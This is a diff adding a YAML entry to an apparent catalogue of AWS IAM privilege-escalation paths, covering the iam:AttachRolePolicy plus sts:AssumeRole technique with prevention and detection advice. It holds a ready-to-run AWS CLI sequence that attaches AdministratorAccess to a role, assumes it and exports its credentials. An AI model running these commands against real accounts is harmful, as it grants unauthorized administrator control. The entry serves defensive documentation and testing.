@@ -1,0 +1,219 @@
+id: "iam-014"
+name: "iam:AttachRolePolicy + sts:AssumeRole"
+category: "lateral-movement"
+services:
+  - iam
+
+permissions:
+  required:
+    - permission: "iam:AttachRolePolicy"
+      resourceConstraints: "Must have access to attach policies to the target role"
+    - permission: "sts:AssumeRole"
+      resourceConstraints: "Must have permission to assume the target role"
+  additional:
+    - permission: "iam:ListRoles"
+      resourceConstraints: "Helpful for discovering available roles that can be modified"
+    - permission: "iam:GetRole"
+      resourceConstraints: "Useful for viewing role trust policies to identify assumable roles"
+    - permission: "iam:ListAttachedRolePolicies"
+      resourceConstraints: "Helpful for viewing current role permissions before and after modification"
+
+description: A principal with `iam:AttachRolePolicy` and `sts:AssumeRole` permissions on the same target role can achieve privilege escalation by attaching an administrative policy (such as the AWS-managed AdministratorAccess policy) to the role, then assuming that role to gain elevated privileges. This is a lateral movement attack where the attacker modifies a different principal's permissions and then assumes that principal's identity. Even if the target role initially has minimal or no privileges, the combination of these two permissions creates a complete privilege escalation path to administrative access.
+
+prerequisites:
+  admin:
+    - "A role must exist that the starting principal has permission to attach policies to"
+    - "The role must have a trust policy that allows the starting principal to assume it"
+    - "The starting principal must have iam:AttachRolePolicy permission scoped to the target role"
+    - "The starting principal must have sts:AssumeRole permission scoped to the target role"
+  lateral:
+    - "A role must exist that the starting principal has permission to attach policies to"
+    - "The role must have a trust policy that allows the starting principal to assume it"
+    - "The starting principal must have iam:AttachRolePolicy permission scoped to the target role"
+    - "The starting principal must have sts:AssumeRole permission scoped to the target role"
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        # Get account ID
+        ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
+        TARGET_ROLE="target-role-name"
+        TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
+      description: "Retrieve the AWS account ID and set the target role ARN"
+    - step: 2
+      command: |
+        # Attach AdministratorAccess policy to the target role
+        aws iam attach-role-policy \
+          --role-name $TARGET_ROLE \
+          --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+      description: "Attach the AWS-managed AdministratorAccess policy to the target role"
+    - step: 3
+      command: |
+        # Wait for IAM policy changes to propagate (15 seconds)
+        sleep 15
+      description: "Wait for the policy attachment to propagate across AWS infrastructure"
+    - step: 4
+      command: |
+        # Verify the policy was attached
+        aws iam list-attached-role-policies \
+          --role-name $TARGET_ROLE \
+          --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
+          --output table
+      description: "Verify that AdministratorAccess is now attached to the target role"
+    - step: 5
+      command: |
+        # Assume the target role with admin permissions
+        CREDENTIALS=$(aws sts assume-role \
+          --role-arn $TARGET_ROLE_ARN \
+          --role-session-name privesc-session \
+          --query 'Credentials' \
+          --output json)
+
+        # Export the temporary credentials
+        export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+        export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+        export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
+      description: "Assume the target role to obtain temporary credentials with administrative permissions"
+    - step: 6
+      command: |
+        # Verify administrative access
+        aws iam list-users --max-items 5
+      description: "Verify that you now have administrative access by listing IAM users"
+
+limitations: |
+  This attack requires that the target role has a trust policy allowing the starting principal to assume it. The attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the role. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.
+
+  Additionally, the starting principal must have both permissions (iam:AttachRolePolicy AND sts:AssumeRole) scoped to the same target role. If these permissions are scoped to different roles, the attack path is not viable.
+
+recommendation: |
+  Restrict `iam:AttachRolePolicy` and `sts:AssumeRole` using the principle of least privilege. These permissions should rarely be granted together on the same target role.
+
+  **Prevention strategies:**
+
+  1. Use IAM policy conditions to restrict which policies can be attached:
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:AttachRolePolicy",
+    "Resource": "arn:aws:iam::ACCOUNT:role/SpecificRole",
+    "Condition": {
+      "ArnNotEquals": {
+        "iam:PolicyARN": [
+          "arn:aws:iam::aws:policy/AdministratorAccess",
+          "arn:aws:iam::aws:policy/PowerUserAccess"
+        ]
+      }
+    }
+  }
+  ```
+
+  2. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies
+
+  3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if admin policies are attached
+
+  4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `sts:AssumeRole` to the same principal for the same role
+
+  5. Require MFA for both policy attachment operations and role assumption
+
+  **Detection strategies:**
+
+  Monitor CloudTrail for the following event patterns:
+  - `AttachRolePolicy` API calls, especially when followed by `AssumeRole` on the same resource within a short time window
+  - Attachment of AWS-managed policies like `AdministratorAccess` or `PowerUserAccess` to roles
+  - Role assumption events (`AssumeRole`) that follow policy modification events
+
+  Set up CloudWatch alarms for unexpected changes to role policies and investigate any modifications to role permissions.
+
+discoveredBy:
+  name: "Spencer Gietzen"
+  organization: "Rhino Security Labs"
+  date: "2019"
+
+references:
+  - title: "AWS IAM Privilege Escalation Methods"
+    url: "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+  - title: "Pathfinder Labs - IAM AttachRolePolicy + AssumeRole Scenario"
+    url: "https://github.com/WithSecureLabs/pathfinder-labs"
+
+relatedPaths:
+  - "iam-001"
+  - "iam-002"
+  - "iam-003"
+
+detectionRules:
+  - platform: "CloudSIEM"
+    ruleId: "TBD"
+    url: "https://docs.datadoghq.com/security/default_rules/"
+
+toolSupport:
+  pmapper: true
+  iamVulnerable: false
+  pacu: false
+  prowler: true
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: starting-principal
+      type: principal
+      description: |
+        The principal initiating the attack. Can be an IAM user or role with both `iam:AttachRolePolicy` and `sts:AssumeRole` permissions on the target role.
+
+        This principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.
+
+    - id: target_role
+      label: target-role
+      type: resource
+      description: |
+        The IAM role being modified and assumed. Must have a trust policy that allows the starting principal to assume it.
+
+        Initially, this role may have minimal or no privileges. The attacker will attach the AdministratorAccess policy to it.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        Full administrative access to the AWS account. The attacker achieves this by:
+        1. Attaching AdministratorAccess policy to the target role
+        2. Assuming the target role to obtain temporary credentials
+        3. Using those credentials to perform administrative actions
+
+        This is a deterministic outcome since the attacker controls which policy to attach to the role.
+
+  edges:
+    - from: start
+      to: target_role
+      label: iam:AttachRolePolicy (AdministratorAccess)
+      description: |
+        The attacker uses `iam:AttachRolePolicy` to attach the AWS-managed AdministratorAccess policy to the target role.
+
+        Command:
+        ```bash
+        aws iam attach-role-policy \
+          --role-name target-role-name \
+          --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
+        ```
+
+        After this action, the target role has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.
+
+    - from: target_role
+      to: admin
+      label: sts:AssumeRole
+      description: |
+        The attacker uses `sts:AssumeRole` to assume the now-privileged target role and obtain temporary credentials.
+
+        Command:
+        ```bash
+        CREDENTIALS=$(aws sts assume-role \
+          --role-arn "arn:aws:iam::ACCOUNT_ID:role/target-role-name" \
+          --role-session-name privesc-session \
+          --query 'Credentials' \
+          --output json)
+
+        export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
+        export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
+        export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
+        ```
+
+        These temporary credentials have full administrative permissions and can be used to perform any action in the AWS account.
